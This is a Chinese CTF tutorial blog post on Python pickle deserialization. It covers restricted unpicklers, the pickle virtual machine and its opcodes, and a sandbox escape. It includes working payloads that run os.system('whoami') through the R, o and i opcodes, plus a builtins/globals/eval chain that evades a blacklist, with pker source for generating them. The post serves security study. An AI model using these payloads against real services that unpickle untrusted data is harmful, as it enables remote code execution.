---
date: 2021-08-14T23:30:20+08:00
title : pickle
---
 相关介绍看[手册](https://docs.python.org/zh-cn/3/library/pickle.html)就行，写的不能再详细。

那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？

毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：

```python
import builtins
import io
import pickle

safe_builtins = {
    'range',
    'complex',
    'set',
    'frozenset',
    'slice',
}

class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))

def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()

test= b"cos\nsystem\n(S'echo hello world'\ntR."
restricted_loads(test)
```

其中这里重写了`find_class`

![image-20210815152312283](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815152312.png)

对**module**限制为**builtins**,并且只允许**safe_builtins**。

```bash
🌀  pickle  python3 main.py
Traceback (most recent call last):
  File "/Users/theoyu/workspace/python/pickle/main.py", line 32, in <module>
    restricted_loads(test)
  File "/Users/theoyu/workspace/python/pickle/main.py", line 28, in restricted_loads
    return RestrictedUnpickler(io.BytesIO(s)).load()
  File "/Users/theoyu/workspace/python/pickle/main.py", line 22, in find_class
    raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
_pickle.UnpicklingError: global 'os.system' is forbidden
```

而出题的话，当然不会直接限制死，往往都是黑名单漏几个，白名单多几个，去构造。这就需要我们手撕opcode，因为`__reduce__`只能返回一个元祖，沙盒逃逸的情况往往都是一长串的。

要解析opcode自然离不开PVM(Pickle Virtual Machine)，pvm涉及到三个部分：

- 解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 `.` 停止。最终留在栈顶的值将被作为反序列化对象返回。
- 栈区：最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护**最顶层的信息**，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。
- 存储区(memo)：将反序列化完成的数据以 `key-value` 的形式储存在memo中，以便后来使用。大多数情况，我们并不需要用到这个部分。

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815155926.png)

Pickletools是一个利于我们反汇编pickle的工具，举一个例子看看

```python
import pickletools
import pickle
import os

class exp(object):
    def __reduce__(self):
        return (os.system,('whoami',))
e = exp()
s = pickle.dumps(e,0)
print(s.decode())
pickletools.dis(s)
```

同时，`pickle.dumps`一共有6种形式，其中版本0最利于我们观察，越往后为了效率增加了很多字符，不过好在load是向前兼容的，所以我们后面的分析都采用版本0

```bash
cposix
system
p0
(Vwhoami
p1
tp2
Rp3
.
    0: c    GLOBAL     'posix system'
   14: p    PUT        0
   17: (    MARK
   18: V        UNICODE    'whoami'
   26: p        PUT        1
   29: t        TUPLE      (MARK at 17)
   30: p    PUT        2
   33: R    REDUCE
   34: p    PUT        3
   37: .    STOP
highest protocol among opcodes = 0

```

关于opcode的语法，官方[源码](https://github.com/python/cpython/blob/3.8/Lib/pickle.py)有点含糊，不过有师傅总结下来了：

| opcode | 描述                                                         | 具体写法                                           | 栈上的变化                                                   | memo上的变化 |
| ------ | ------------------------------------------------------------ | -------------------------------------------------- | ------------------------------------------------------------ | ------------ |
| c      | 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包） | c[module]\n[instance]\n                            | 获得的对象入栈                                               | 无           |
| o      | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o                                                  | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 | 无           |
| i      | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） | i[module]\n[callable]\n                            | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 | 无           |
| N      | 实例化一个None                                               | N                                                  | 获得的对象入栈                                               | 无           |
| S      | 实例化一个字符串对象                                         | S'xxx'\n（也可以使用双引号、\'等python字符串形式） | 获得的对象入栈                                               | 无           |
| V      | 实例化一个UNICODE字符串对象                                  | Vxxx\n                                             | 获得的对象入栈                                               | 无           |
| I      | 实例化一个int对象                                            | Ixxx\n                                             | 获得的对象入栈                                               | 无           |
| F      | 实例化一个float对象                                          | Fx.x\n                                             | 获得的对象入栈                                               | 无           |
| R      | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 | R                                                  | 函数和参数出栈，函数的返回值入栈                             | 无           |
| .      | 程序结束，栈顶的一个元素作为pickle.loads()的返回值           | .                                                  | 无                                                           | 无           |
| (      | 向栈中压入一个MARK标记                                       | (                                                  | MARK标记入栈                                                 | 无           |
| t      | 寻找栈中的上一个MARK，并组合之间的数据为元组                 | t                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| )      | 向栈中直接压入一个空元组                                     | )                                                  | 空元组入栈                                                   | 无           |
| l      | 寻找栈中的上一个MARK，并组合之间的数据为列表                 | l                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| ]      | 向栈中直接压入一个空列表                                     | ]                                                  | 空列表入栈                                                   | 无           |
| d      | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） | d                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| }      | 向栈中直接压入一个空字典                                     | }                                                  | 空字典入栈                                                   | 无           |
| p      | 将栈顶对象储存至memo_n                                       | pn\n                                               | 无                                                           | 对象被储存   |
| g      | 将memo_n的对象压栈                                           | gn\n                                               | 对象被压栈                                                   | 无           |
| 0      | 丢弃栈顶对象                                                 | 0                                                  | 栈顶对象被丢弃                                               | 无           |
| b      | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 | b                                                  | 栈上第一个元素出栈                                           | 无           |
| s      | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 | s                                                  | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 | 无           |
| u      | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u                                                  | MARK标记以及被组合的数据出栈，字典被更新                     | 无           |
| a      | 将栈的第一个元素append到第二个元素(列表)中                   | a                                                  | 栈顶元素出栈，第二个元素（列表）被更新                       | 无           |
| e      | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 | e                                                  | MARK标记以及被组合的数据出栈，列表被更新                     | 无           |

结合语法，重新分析一下opcode

```bash
    0: c    GLOBAL     'posix system  ' #对象入栈 unix为posix windows为nt
   14: p    PUT        0 						  	#存储到memo的0位置
   17: (    MARK  									    #向栈中压入一个MARK标记 左括号标志符
   18: V        UNICODE    'whoami'     #压入一个字符串
   26: p        PUT        1            #存储到memo的1位置
   29: t        TUPLE      (MARK at 17) #在栈中寻找上一个MARK标记，将其和中间内容出栈，参数形成元祖入栈
   30: p    PUT        2							  #存储到memo的2位置
   33: R    REDUCE											# system("whoami")出栈，结果如栈
   34: p    PUT        3								# 结果存储到memo3
   37: .    STOP												# 停止
```

结合语法来说的话，还是可以理解了，加上memo上的操作可以省略，简化为：

 ```python
 import pickle
 
 a='''cposix
 system
 (Vwhoami
 tR.'''
 
 print(a)
 pickle.loads(a.encode())
 
 #theoyu
 ```

上面用了**R**做了函数执行，同时**i**，**o**稍作修改也可以达到一样的效果

```python
# o
'''(cos
system
S'whoami'
o.'''
pickletools->
    0: (    MARK
    1: c        GLOBAL     'os system'
   12: S        STRING     'whoami'
   22: o        OBJ        (MARK at 0)
   23: .    STOP


# i
'''(S'whoami'
ios
system
.'''
pickletools->
    0: (    MARK
    1: S        STRING     'whoami'
   11: i        INST       'os system' (MARK at 0)
   22: .    STOP

```

拿p神经典的code_break试试：

- 模块白名单：`builtins`
- 子模块黑名单：`'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'`

因为只禁用了子模块，我们可以先通过一轮global+get重新筛选出builtins，再构造即可。

先构造`__builtins__.globals().get('__builtins__')`拿到可以执行eval的builtins,再执行`builtins.getattr(builtins, 'eval'),('__import__("os").system("whoami")',)`即可。

```python
cbuiltins
getattr
(cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'__builtins__'   #拿到bultins
tRS'eval'
tRp1
(S'__import__("os").system("whoami")'
tR.
```

不过这样看起来还是有一些费劲的,学长@iv4n写的[pker](https://github.com/eddieivan01/pker)利用遍历AST结点自动化构建解决了这个问题

上述例子只需要构造：

```pker
getattr = GLOBAL('builtins', 'getattr')
dict = GLOBAL('builtins', 'dict')
dict_get = getattr(dict, 'get')
globals = GLOBAL('builtins', 'globals')
builtins = globals()
__builtins__ = dict_get(builtins, '__builtins__')
eval = getattr(__builtins__, 'eval')
eval('__import__("os").system("whoami")')
return
```

其中

```
GLOBAL
对应opcode：b'c'
获取module下的一个全局对象（没有import的也可以，比如下面的os）：
GLOBAL('os', 'system')
输入：module,instance(callable、module都是instance)  

INST
对应opcode：b'i'
建立并入栈一个对象（可以执行一个函数）：
INST('os', 'system', 'ls')  
输入：module,callable,para 

OBJ
对应opcode：b'o'
建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
OBJ(GLOBAL('os', 'system'), 'ls') 
输入：callable,para

xxx(xx,...)
对应opcode：b'R'
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
对应opcode：b's'
更新列表或字典的某项的值

xx.attr=123
对应opcode：b'b'
对xx对象进行属性设置

return
对应opcode：b'0'
出栈（作为pickle.loads函数的返回值）：
```

即可生成opcode。

参考：

- [pickle反序列化初探](https://xz.aliyun.com/t/7436)
- [通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012#toc-0)
- [pker](https://github.com/eddieivan01/pker)

